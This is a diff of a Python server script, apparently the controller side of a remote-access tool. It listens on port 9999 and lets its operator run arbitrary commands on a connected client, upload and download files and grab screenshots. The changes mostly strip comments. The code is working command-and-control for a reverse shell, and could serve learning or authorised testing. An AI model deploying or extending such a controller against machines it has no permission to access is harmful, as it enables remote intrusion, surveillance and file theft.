@@ -3,8 +3,8 @@ import os
 import threading
 import time
 
-HOST = "0.0.0.0" # Listen on all interfaces, including the VPN tunnel
-PORT = 9999      # Matches "Local Port" in image_82d86a.png
+HOST = "0.0.0.0" # listen on all interfaces i should keep it if it work
+PORT = 9999      
 
 def send_file(file_path, conn):
     """Send file from server to client""" 
@@ -111,24 +111,24 @@ def handle_client(client, addr):
 
     while True:
         try:
-            # Show prompt and get command
+            
             command = input(f"\n{addr[0]}:{addr[1]} >> ").strip()
 
             if not command:
                 continue
 
-            # Handle help command locally
+            
             if command.lower() in ["help", "?", "h"]:
                 print_help()
                 continue
 
-            # Handle exit command
+            
             if command.lower() == "exit":
                 print("[!] Sending exit command to client...")
                 client.send(command.encode())
                 break
 
-            # Handle upload command (server -> client)
+            # Handle upload command (server to client)
             elif command.startswith("upload "):
                 filename = command[7:].strip()
                 if not filename:
@@ -143,17 +143,17 @@ def handle_client(client, addr):
                 print(f"[*] Uploading '{filename}' to client...")
                 client.send(command.encode())
 
-                # Wait for client ready signal
+                
                 response = client.recv(1024).decode()
                 if "[READY]" in response:
                     send_file(filename, client)
-                    # Get confirmation from client
+                    # Get confirmation from stupid client
                     response = client.recv(1024).decode()
                     print(response.strip())
                 else:
                     print("[-] Client not ready for upload")
 
-            # Handle download command (client -> server)
+            
             elif command.startswith("download "):
                 filepath = command[9:].strip()
                 if not filepath:
@@ -163,25 +163,25 @@ def handle_client(client, addr):
                 print(f"[*] Downloading '{filepath}' from client...")
                 client.send(command.encode())
 
-                # Receive the file
+                
                 filename = os.path.basename(filepath)
                 if not filename:
                     filename = "downloaded_file"
 
                 receive_file(client, filename)
 
-            # Handle screenshot command
+            
             elif command.lower() == "screenshot":
                 print("[*] Requesting screenshot from client...")
                 client.send(command.encode())
                 receive_screenshot(client)
 
-            # Handle all other commands
+            
             else:
                 client.send(command.encode())
 
-                # Receive response with timeout handling
-                client.settimeout(10.0)  # 10 second timeout
+                
+                client.settimeout(10.0)  
                 try:
                     response = client.recv(8192).decode(errors="ignore")
                     if response:
@@ -193,7 +193,7 @@ def handle_client(client, addr):
                 except Exception as e:
                     print(f"[-] Error receiving response: {str(e)}")
                 finally:
-                    client.settimeout(None)  # Remove timeout
+                    client.settimeout(None)  # remove timeout
 
         except KeyboardInterrupt:
             print("\n[!] Keyboard interrupt detected")
@@ -230,7 +230,7 @@ def main():
                 client, addr = s.accept()
                 print(f"\n[+] New connection from {addr}")
 
-                # Handle each client in the main thread for interactive control
+                
                 handle_client(client, addr)
 
             except KeyboardInterrupt:
